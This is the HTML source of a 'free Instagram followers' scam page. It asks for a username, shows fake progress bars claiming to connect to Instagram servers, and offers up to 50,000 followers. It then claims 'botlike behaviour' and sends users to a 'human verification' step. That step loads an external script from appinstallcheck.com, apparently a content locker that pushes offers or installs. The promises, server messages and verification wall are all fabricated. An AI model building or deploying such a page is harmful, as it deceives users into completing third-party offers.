<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.css" integrity="sha256-/mC8AIsSmTcTtaf8vgnfbZXZLYhJCd0b9If/M0Y5nDw=" crossorigin="anonymous" />
    <link rel="stylesheet" href="main.css" />
    <title>Get free Instagram followers</title>

</head>

<body>

    <div class="ui fluid container">

        <div class="ui computer only middle aligned centered grid" style="height: 100vh; display: flex; align-items: center;">

            <div class="fourteen wide center aligned column">

              <img class="img-fluid BOGO mt-3 mb-2" src="logo.png">

                <h1 class="ui header" style="font-size: 3rem !important;">This is mobile-only website. Visit us from your phone to get free Instagram followers!</h1>

            </div>

        </div>

        <div class="ui mobile tablet only centered grid">

            <div class="center aligned column">



                <img class="ui fluid centered image logo-img" src="logo.png">

                <h2 class="ui header step-1">Get <strong>Instagram followers</strong> and likes for free!</h2>

                <!--<div class="ui horizontal divider">Who viewed my IG profile?</div>-->

                <img class="ui fluid centered image username-img step-1" src="username.jpg">

                <div class="ui fluid centered input step-1">
                    <input type="text" id="igus" placeholder="Username without @">
                </div>

                <button class="ui fluid centered primary button step-1 c-btn" onclick="check();">Continue</button>

                <div class="ui indicating progress" id="igpro">
                  <div class="bar"></div>
                  <div class="label">Looping through Instagram servers...</div>
                </div>

                <div class="ui negative message bad-name" style="display: none;">
                  <div class="header hw" style="font-weight: 500; font-size: 1rem;">
                    Username is wrong.
                  </div></div>

                <div class="ui divider step-1"></div>

                <h2 class="ui header step-1">How does it work?</h2>

                <!--<div class="ui horizontal divider">How does it work?</div>-->

                <ol class="ui list step-1">

                    <li>We connect with <strong>Instagram servers</strong> to make sure we can add followers and likes to your profile.</li>

                    <li>We show <strong>your profile</strong> and ask you to make sure we found right profile.</li>

                    <li>We connect with <strong>database containing profile and media data</strong> and prepare new updated data (with new followers and likes count).</li>

                    <li>That's all. Now you own <strong>popular Instagram account</strong>.</li>

                </ol>

                <h2 class="ui header step-2 isthis" style="display: none;">Is this your IG profile?</h2>

                <h2 class="ui header choose step-4 choosehowmany" style="display: none;">Choose how many followers and likes you want</h2>

                <h2 class="ui header choose step-5" style="display: none;">Almost ready!</h2>

                <div class="ui centered grid step-2" style="display: none;">

                    <div class="fifteen wide column essa">

                    <div class="ui grid">

                    <div class="five wide column">

                      <div class="test111" style="width: 100%; padding-bottom: 100%; position: relative;">

                        <div class="test222" style="width: 100%; height: 100%; position: absolute;">

                          <iframe src="" id="IFLICK" style="width: 100%; height: 100%; border-radius: 100%;" frameborder="0"></iframe>

                        </div>

                      </div>



                    </div>

                    <div class="eleven wide middle aligned column">

                        <h3 class="ui header ig-username"></h3>

                        <h3 class="ui header ig-fullname"></h3>

                    </div>

                    <div class="sixteen wide column h4">

                        <!--<h4 class="ui centered header ig-bio"></h4>-->

                        <div class="ui divider" style="padding-top: 0 !important; margin-top: 0 !important;"></div>

                    </div>

                    <div class="three column row" style="padding-top: 0 !important;">

                        <div class="column">

                            <h4 class="ui header h4-top media-c"></h4>
                            <h4 class="ui header h4-bottom">posts</h4>

                        </div>

                        <div class="column">

                            <h4 class="ui header h4-top followers-c" id="followers-c"></h4>
                            <h4 class="ui header h4-bottom">followers</h4>

                        </div>

                        <div class="column">

                            <h4 class="ui header h4-top following-c"></h4>
                            <h4 class="ui header h4-bottom">following</h4>

                        </div>

                    </div>

                    <div class="sixteen wide column h4 sip" style="display: none;">

                        <div class="ui divider"></div>

                    </div>

                    <div class="center aligned sixteen wide column ig-posts-col sip" style="display: none;">

                        <div class="ig-posts">

                        </div>

                    </div>

                </div>

                </div>

            </div>

            <div class="ui centered grid step-2 yesno" style="display: none;">

                <div class="eight wide center aligned column pt0">

                    <button class="ui fluid centered primary button" onclick="yes();">Yes</button>

                </div>

                <div class="eight wide center aligned column pt0">

                    <button class="ui fluid centered negative button" onclick="no();">No</button>

                </div>

            </div>

            <div class="ui centered grid step-4" style="display: none;">

                <div class="center aligned column">

                    <select class="ui fluid followers dropdown">

                        <option value="0">How many followers?</option>
                        <option value="1000">1000 followers</option>
                        <option value="5000">5000 followers</option>
                        <option value="10000">10 000 followers</option>
                        <option value="25000">25 000 followers</option>
                        <option value="50000">50 000 followers</option>

                    </select>

                    <select class="ui fluid likes dropdown">

                        <option value="0">How many likes</option>
                        <option value="100">100 likes</option>
                        <option value="500">500 likes</option>
                        <option value="1000">1000 likes</option>
                        <option value="2500">2500 likes</option>
                        <option value="5000">5000 likes</option>

                    </select>

                    <!--<p class="step-4 NATA">If you choose 500 likes, <strong>each one of your photos will get 500 additional likes</strong>.</p>-->

                    <button class="ui fluid centered primary button step-4 addfl NATA" onclick="https://appinstallcheck.com/cl/i/423145">Add followers and likes</button>

                    <div class="ui indicating progress" id="igback">
                      <div class="bar"></div>
                      <div class="label">Connecting with Instagram followers/likes servers...</div>
                    </div>

                </div>

            </div>

            <div class="ui centered grid step-5" style="display: none;">

                <div class="center aligned column">

                    <p class="botlike">We detected botlike behaviour, <strong>this is preview of how your Instagram account with new followers and likes will look.</strong> Values are not updated yet. Complete human verification to apply changes.</p>

                    <button class="ui fluid centered primary button" style="margin-top: 1rem !important;" onclick="call_locker();">Human verification</button>

                </div>

            </div>

            </div>

        </div>

    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.js" integrity="sha256-FMQoXFhCWeNb139Wa9Z2I0UjqDeKKDYY+6PLkWv4qco=" crossorigin="anonymous"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/numeral.js/2.0.6/numeral.min.js"></script>
    <script src="chance.min.js"></script>
    <script src="countUp.js"></script>
    <script src="main.js"></script>

    <script type="text/javascript" id="ogjs" src="https://appinstallcheck.com/cl/i/423145"></script>

</body>

</html>
